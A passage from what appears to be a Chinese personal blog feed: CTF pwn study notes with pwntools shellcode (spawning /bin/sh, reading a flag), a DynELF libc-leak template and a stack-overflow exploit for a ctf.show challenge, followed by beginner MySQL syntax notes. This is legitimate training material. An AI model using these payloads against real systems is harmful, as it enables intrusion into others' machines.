pro.got[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的got表地址</span></span><br><span class="line"><span class="comment"># search的参数为字节类型</span></span><br><span class="line"><span class="comment"># 获取字符串的位置</span></span><br><span class="line">str_addr = <span class="built_in">next</span>(pro.search(<span class="string">b&quot;str&quot;</span>))</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取libc中read的固定偏移值</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># 获取/bin/sh的位置</span></span><br></pre></td></tr></table></figure>

<h3 id="shellcode的生成"><a href="#shellcode的生成" class="headerlink" title="shellcode的生成"></a>shellcode的生成</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 汇编代码</span></span><br><span class="line">code = asm(code)        <span class="comment"># opcode，payload中都使用这个</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 同上</span></span><br><span class="line">code = asm(code)        <span class="comment"># 同上</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面是执行execve(&quot;/bin/sh\x00&quot;)的shellcode</span></span><br><span class="line"><span class="comment"># 下面展示直接读取flag文件然后打印的shellcode</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">mmap = <span class="number">0x12345678</span>  <span class="comment"># 可读可写内存区域</span></span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="number">3</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code = asm(code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更简洁的写法</span></span><br><span class="line">code = asm(shellcraft.cat(<span class="string">&quot;flag&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>执行，加了print base64</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">    /* push &#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2.7/site-packages/pwnlib/data/includes /dev/stdin</span><br><span class="line">[DEBUG] Assembling</span><br><span class="line">    .section .shellcode,&quot;awx&quot;</span><br><span class="line">    .global _start</span><br><span class="line">    .global __start</span><br><span class="line">    .p2align 2</span><br><span class="line">    _start:</span><br><span class="line">    __start:</span><br><span class="line">    .intel_syntax noprefix</span><br><span class="line">        /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">        /* push &#x27;/bin///sh\x00&#x27; */</span><br><span class="line">        push 0x68</span><br><span class="line">        push 0x732f2f2f</span><br><span class="line">        push 0x6e69622f</span><br><span class="line">        mov ebx, esp</span><br><span class="line">        /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">        /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">        push 0x1010101</span><br><span class="line">        xor dword ptr [esp], 0x1016972</span><br><span class="line">        xor ecx, ecx</span><br><span class="line">        push ecx /* null terminate */</span><br><span class="line">        push 4</span><br><span class="line">        pop ecx</span><br><span class="line">        add ecx, esp</span><br><span class="line">        push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">        mov ecx, esp</span><br><span class="line">        xor edx, edx</span><br><span class="line">        /* call execve() */</span><br><span class="line">        push 11 /* 0xb */</span><br><span class="line">        pop eax</span><br><span class="line">        int 0x80</span><br><span class="line">[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-IlAesT/step2 /tmp/pwn-asm-IlAesT/step1</span><br><span class="line">[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-IlAesT/step3 /tmp/pwn-asm-IlAesT/step4</span><br><span class="line">amhoLy8vc2gvYmluieNoAQEBAYE0JHJpAQExyVFqBFkB4VGJ4THSagtYzYA=</span><br></pre></td></tr></table></figure>

<h3 id="DynELF泄露libc"><a href="#DynELF泄露libc" class="headerlink" title="DynELF泄露libc"></a>DynELF泄露libc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下面展示的是DynELF的使用模板</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="comment"># 这里的代码比较抽象</span></span><br><span class="line">	<span class="comment"># 其实目的就是利用能够回显字符的函数泄露addr，返回地址为start</span></span><br><span class="line">	<span class="comment"># data接受的数据只能是回显的addr地址上的内容，将空字符处理为\x00</span></span><br><span class="line">	payload = padding + addr + start</span><br><span class="line">	p.send(payload)</span><br><span class="line">	data = p.recv()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造DynELF实例，第一个参数为leak函数，第二个为题目的ELF对象</span></span><br><span class="line">d = DynELF(leak, elf=pro)</span><br><span class="line">system = d.lookup(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;libc&quot;</span>)  <span class="comment"># 泄露出system的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system ====&gt; &quot;</span>, system, <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实战链接</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/111638914</span></span><br><span class="line"><span class="comment"># 详细的用法讲解，包括write/puts/printf三个函数的用法和细节处理</span></span><br><span class="line"><span class="comment"># https://www.anquanke.com/post/id/85129</span></span><br></pre></td></tr></table></figure>

<p>后面的不太看得懂了，先不管</p>
<h2 id="pwn02"><a href="#pwn02" class="headerlink" title="pwn02"></a>pwn02</h2><p>main函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;stack happy!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;32bits\n&quot;</span>);</span><br><span class="line">  <span class="built_in">pwnme</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pwnme函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">9</span>]; <span class="comment">// [esp+Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>fgets</code>处存在栈溢出,<code>s</code>距离ebp为0x9,那么覆盖到返回地址的长度还要再加上0x4，然后写0804850F</p>
<p>后门地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804850F                               public stack</span><br><span class="line">.text:0804850F                               stack proc near</span><br><span class="line">.text:0804850F                               ; __unwind &#123;</span><br><span class="line">.text:0804850F 55                            push    ebp</span><br><span class="line">.text:08048510 89 E5                         mov     ebp, esp</span><br><span class="line">.text:08048512 83 EC 08                      sub     esp, 8</span><br><span class="line">.text:08048515 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:08048518 68 30 86 04 08                push    offset command                  ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0804851D E8 8E FE FF FF                call    _system</span><br><span class="line">.text:0804851D</span><br><span class="line">.text:08048522 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048525 90                            nop</span><br><span class="line">.text:08048526 C9                            leave</span><br><span class="line">.text:08048527 C3                            retn</span><br><span class="line">.text:08048527                               ; &#125; // starts at 804850F</span><br><span class="line">.text:08048527</span><br><span class="line">.text:08048527                               stack endp</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28109</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)</span><br><span class="line"><span class="built_in">print</span>(payload) <span class="comment"># aaaaaaaaaaaaa\x0f\x04</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-03"><a href="#pwn-03" class="headerlink" title="pwn 03"></a>pwn 03</h2><p>查看保护</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ checksec stack1</span><br><span class="line">[*] &#x27;/home/ubuntu/Desktop/pwnremote/stack1&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p><strong>可以用<code>puts</code>函数泄露出任意函数的<code>got</code>表地址,从而泄露libc,就可以根据相对偏移getshell</strong></p>
<p>上面这句话没懂，搜下相关东西：</p>
<p><a href="https://blog.csdn.net/Morphy_Amo/article/details/121845113">【PWN学习】如何获取libc基址_查看libc基址_Morphy_Amo的博客-CSDN博客</a></p>
<p><a href="https://www.freesion.com/article/5901691025/">CTF中的PWN——绕canary防护3（选择项+puts带出canary+泄露函数地址计算基地址） - 灰信网（软件开发博客聚合） (freesion.com)</a></p>
<p>明天继续</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql_basic</title>
    <url>/2023/03/03/mysql-basic/</url>
    <content><![CDATA[<h1 id="mysql概述"><a href="#mysql概述" class="headerlink" title="mysql概述"></a>mysql概述</h1><h2 id="数据库相关概念"><a href="#数据库相关概念" class="headerlink" title="数据库相关概念"></a>数据库相关概念</h2><table>
<thead>
<tr>
<th>名称</th>
<th>全称</th>
<th>简称</th>
</tr>
</thead>
<tbody><tr>
<td>数据库</td>
<td>存储数据的仓库，数据是有组织的进行存储</td>
<td>DataBase（DB）</td>
</tr>
<tr>
<td>数据库管理系统</td>
<td>操纵和管理数据库的大型软件</td>
<td>DataBase Management System (DBMS)</td>
</tr>
<tr>
<td>SQL</td>
<td>操作关系型数据库的语言，定义了一套操作关系型数据库统一标准</td>
<td>Structured Query Language (SQL)</td>
</tr>
</tbody></table>
<span id="more"></span>

<h2 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>MySQL官方提供了两种不同的版本：</p>
<p> 社区版本（MySQL Community Server） 免费， MySQL不提供任何技术支持 </p>
<p>商业版本（MySQL Enterprise Edition） 收费，可以使用30天，官方提供技术支持</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>略</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h3 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h3><p>cmd输入services.msc</p>
<p>找到</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303094200943.png" alt="image-20230303094200943"></p>
<p>控制登录与启动</p>
<p>或者命令行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net start mysql80</span><br><span class="line">net stop mysql80</span><br></pre></td></tr></table></figure>

<h3 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h3><p> 方式一：使用MySQL提供的客户端命令行工具</p>
<p>方式二：使用系统自带的命令行工具执行指令（需要配置系统变量）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql [-h 127.0.0.1] [-P 3306] -u root -p</span><br><span class="line">参数：</span><br><span class="line">-h : MySQL服务所在的主机IP</span><br><span class="line">-P : MySQL服务端口号， 默认3306</span><br><span class="line">-u : MySQL数据库用户名</span><br><span class="line">-p ： MySQL数据库用户名对应的密码</span><br></pre></td></tr></table></figure>

<h3 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h3><h4 id="关系型数据库（RDBMS）"><a href="#关系型数据库（RDBMS）" class="headerlink" title="关系型数据库（RDBMS）"></a>关系型数据库（RDBMS）</h4><p>概念：建立在关系模型基础上，由多张相互连接的二维表组成的数据库。 而所谓二维表，指的是由行和列组成的表，如下图（就类似于Excel表格数据，有表头、有列、有行， 还可以通过一列关联另外一个表格中的某一列数据）。我们之前提到的MySQL、Oracle、DB2、 SQLServer这些都是属于关系型数据库，里面都是基于二维表存储数据的。简单说，基于二维表存储 数据的数据库就成为关系型数据库，不是基于二维表存储数据的数据库，就是非关系型数据库。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095014254.png" alt="image-20230303095014254"></p>
<p>特点： A. 使用表存储数据，格式统一，便于维护。 B. 使用SQL语言操作，标准统一，使用方便。</p>
<h4 id="数据模型-1"><a href="#数据模型-1" class="headerlink" title="数据模型"></a>数据模型</h4><p>MySQL是关系型数据库，是基于二维表进行数据存储的，具体的结构图下：</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095111026.png" alt="image-20230303095111026" style="zoom:50%;" />

<p>我们可以通过MySQL客户端连接数据库管理系统DBMS，然后通过DBMS操作数据库。</p>
<p> 可以使用SQL语句，通过数据库管理系统操作数据库，以及操作数据库中的表结构及数据。</p>
<p> 一个数据库服务器中可以创建多个数据库，一个数据库中也可以包含多张表，而一张表中又可以包 含多行记录。</p>
<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><h2 id="SQL通用语法"><a href="#SQL通用语法" class="headerlink" title="SQL通用语法"></a>SQL通用语法</h2><p>1). SQL语句可以单行或多行书写，以分号结尾。</p>
<p> 2). SQL语句可以使用空格&#x2F;缩进来增强语句的可读性。 </p>
<p>3). MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。 </p>
<p>4). 注释： 单行注释：– 注释内容 或 # 注释内容 多行注释：&#x2F;*注释内容 *&#x2F;</p>
<h2 id="SQL分类"><a href="#SQL分类" class="headerlink" title="SQL分类"></a>SQL分类</h2><table>
<thead>
<tr>
<th align="center">分 类</th>
<th align="center">全称</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">DDL</td>
<td align="center">Data Definition Language</td>
<td align="center">数据定义语言，用来定义数据库对象(数据库，表， 字段)</td>
</tr>
<tr>
<td align="center">DML</td>
<td align="center">Data Manipulation Language</td>
<td align="center">数据操作语言，用来对数据库表中的数据进行增删改</td>
</tr>
<tr>
<td align="center">DQL</td>
<td align="center">Data Query Language</td>
<td align="center">数据查询语言，用来查询数据库中表的记录</td>
</tr>
<tr>
<td align="center">DCL</td>
<td align="center">Data Control Language</td>
<td align="center">数据控制语言，用来创建数据库用户、控制数据库的 访问权限</td>
</tr>
</tbody></table>
<h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h2><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>1). 查询所有数据库 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases ;</span><br></pre></td></tr></table></figure>

<p>2). 查询当前数据库 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select database() ;</span><br></pre></td></tr></table></figure>

<p>3). 创建数据库 create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序 规则 ] ;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序</span><br><span class="line">规则 ] ;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<p>A:创建一个itcast数据库, 使用数据库默认的字符集。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database itcast;</span><br><span class="line">create database if not extists itcast;</span><br></pre></td></tr></table></figure>

<p>B:创建一个itheima数据库，并且指定字符集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database itheima default charset utf8mb4;</span><br><span class="line">-- create database itheima default charset utf8;一般不建议使用utf-8</span><br></pre></td></tr></table></figure>

<p>4). 删除数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database [ if exists ] 数据库名 ;</span><br></pre></td></tr></table></figure>

<p>5). 切换数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 数据库名 ;</span><br><span class="line"># 可以使用select database();看自己当前使用的哪个数据库</span><br></pre></td></tr></table></figure>

<h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><h4 id="查询创建"><a href="#查询创建" class="headerlink" title="查询创建"></a>查询创建</h4><p>1). 查询当前数据库所有表 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables; </span><br></pre></td></tr></table></figure>

<p>2). 查看指定表结构 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc 表名 ;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102245084.png" alt="image-20230303102245084"></p>
<p>通过这条指令，我们可以查看到指定表的字段，字段的类型、是否可以为NULL，是否存在默认值等信 息。</p>
<p> 3). 查询指定表的建表语句 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table 表名 ;</span><br></pre></td></tr></table></figure>

<p>通过这条指令，主要是用来查看建表语句的，而有部分参数我们在创建表的时候，并未指定也会查询 到，因为这部分是数据库的默认值，如：存储引擎、字符集等。</p>
<p>4). 创建表结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE 表名(</span><br><span class="line">字段1 字段1类型 [ COMMENT 字段1注释 ],</span><br><span class="line">字段2 字段2类型 [COMMENT 字段2注释 ],</span><br><span class="line">字段3 字段3类型 [COMMENT 字段3注释 ],</span><br><span class="line">......</span><br><span class="line">字段n 字段n类型 [COMMENT 字段n注释 ]</span><br><span class="line">) [ COMMENT 表注释 ] ;</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table tb_user(</span><br><span class="line">id int comment &#x27;编号&#x27;,</span><br><span class="line">name varchar(50) comment &#x27;姓名&#x27;,</span><br><span class="line">age int comment &#x27;年龄&#x27;,</span><br><span class="line">gender varchar(1) comment &#x27;性别&#x27;</span><br><span class="line">) comment &#x27;用户表&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102945089.png" alt="image-20230303102945089"></p>
<h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>参考菜鸟教程</p>
<p><a href="https://www.runoob.com/mysql/mysql-data-types.html">MySQL 数据类型 | 菜鸟教程 (runoob.com)</a></p>
<p>1). 数值类型</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1). 年龄字段 -- 不会出现负数, 而且人的年龄不会太大</span><br><span class="line">age tinyint unsigned</span><br><span class="line">2). 分数 -- 总分100分, 最多出现一位小数</span><br><span class="line">score double(4,1)</span><br></pre></td></tr></table></figure>

<p>2). 字符串类型</p>
<p>vchar性能比char要低一些</p>
<p>用户名：vchar</p>
<p>性别：char</p>
<p>3). 日期时间类型</p>
<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>设计一张员工信息表，要求如下：</p>
<ol>
<li>编号（纯数字） </li>
<li>员工工号 (字符串类型，长度不超过10位) </li>
<li>员工姓名（字符串类型，长度不超过10位） </li>
<li>性别（男&#x2F;女，存储一个汉字） </li>
<li>年龄（正常人年龄，不可能存储负数） </li>
<li>身份证号（二代身份证号均为18位，身份证中有X这样的字符） 入职时间（取值年月日即可）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table emp(</span><br><span class="line">    id int comment &quot;编号&quot;,</span><br><span class="line">    workno varchar(10) comment &quot;员工工号&quot;,</span><br><span class="line">    name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class="line">	gender char(1) comment &#x27;性别&#x27;,</span><br><span class="line">	age tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class="line">	idcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class="line">	entrydate date comment &#x27;入职时间&#x27;</span><br><span class="line">) comment &quot;员工表&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><p>1). 添加字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD 字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>

<p>案例: </p>
<p>为emp表增加一个新的字段”昵称”为nickname，类型为varchar(20)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp ADD nickname varchar(20) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>

<p>2). 修改数据类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 MODIFY 字段名 新数据类型 (长度);</span><br></pre></td></tr></table></figure>

<p>3). 修改字段名和字段类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>

<p>案例: 将emp表的nickname字段修改为username，类型为varchar(30)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>

<p>4). 删除字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 DROP 字段名;</span><br></pre></td></tr></table></figure>

<p>案例: 将emp表的字段username删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp DROP username;</span><br></pre></td></tr></table></figure>

<p>5). 修改表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 RENAME TO 新表名;</span><br></pre></td></tr></table></figure>

<p>案例:</p>
<p> 将emp表的表名修改为 employee</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp RENAME TO employee;</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>1). 删除表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE [ IF EXISTS ] 表名;</span><br><span class="line">DROP TABLE IF EXISTS tb_user;</span><br></pre></td></tr></table></figure>

<p>2). 删除指定表, 并重新创建表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TRUNCATE TABLE 表名;-- 在删除表的时候，表中的全部数据也都会被删除。</span><br></pre></td></tr></table></figure>

<h2 id="图形化界面工具"><a href="#图形化界面工具" class="headerlink" title="图形化界面工具"></a>图形化界面工具</h2><p>主流工具：sqlyog、Navicate、DataGrip</p>
<p>这次使用DataGrip</p>
<p>还挺好用，不会的sql可以在这里面看对于语句。</p>
<h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><h3 id="添加数据（INSERT）"><a href="#添加数据（INSERT）" class="headerlink" title="添加数据（INSERT）"></a>添加数据（INSERT）</h3><p>1). 给指定字段添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);</span><br><span class="line">insert into employee(id,workno,name,gender,age,idcard,entrydate)</span><br><span class="line">values(1,&#x27;1&#x27;,&#x27;Itcast&#x27;,&#x27;男&#x27;,10,&#x27;123456789012345678&#x27;,&#x27;2000-01-01&#x27;);</span><br><span class="line"></span><br><span class="line">insert into employee values(3,&#x27;3&#x27;,&#x27;韦一笑&#x27;,&#x27;男&#x27;,38,&#x27;123456789012345670&#x27;,&#x27;2005-01-</span><br><span class="line">01&#x27;),(4,&#x27;4&#x27;,&#x27;赵敏&#x27;,&#x27;女&#x27;,18,&#x27;123456789012345670&#x27;,&#x27;2005-01-01&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="修改数据（UPDATE）"><a href="#修改数据（UPDATE）" class="headerlink" title="修改数据（UPDATE）"></a>修改数据（UPDATE）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE 表名 SET 字段名1 = 值1 , 字段名2 = 值2 , .... [ WHERE 条件 ] ;</span><br><span class="line">update employee set name = &#x27;itheima&#x27; where id = 1;</span><br><span class="line">update employee set name = &#x27;小昭&#x27; , gender = &#x27;女&#x27; where id = 1;</span><br><span class="line">update employee set entrydate = &#x27;2008-01-01&#x27;;</span><br></pre></td></tr></table></figure>



<h3 id="删除数据（DELETE）"><a href="#删除数据（DELETE）" class="headerlink" title="删除数据（DELETE）"></a>删除数据（DELETE）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM 表名 [ WHERE 条件 ] ;</span><br><span class="line">delete from employee where gender = &#x27;女&#x27;;</span><br><span class="line">delete from employee;</span><br></pre></td></tr></table></figure>

<h2 id="DOL"><a href="#DOL" class="headerlink" title="DOL"></a>DOL</h2><p>DQL英文全称是Data Query Language(数据查询语言)，数据查询语言，用来查询数据库中表的记 录。</p>
<p>数据准备:</p>
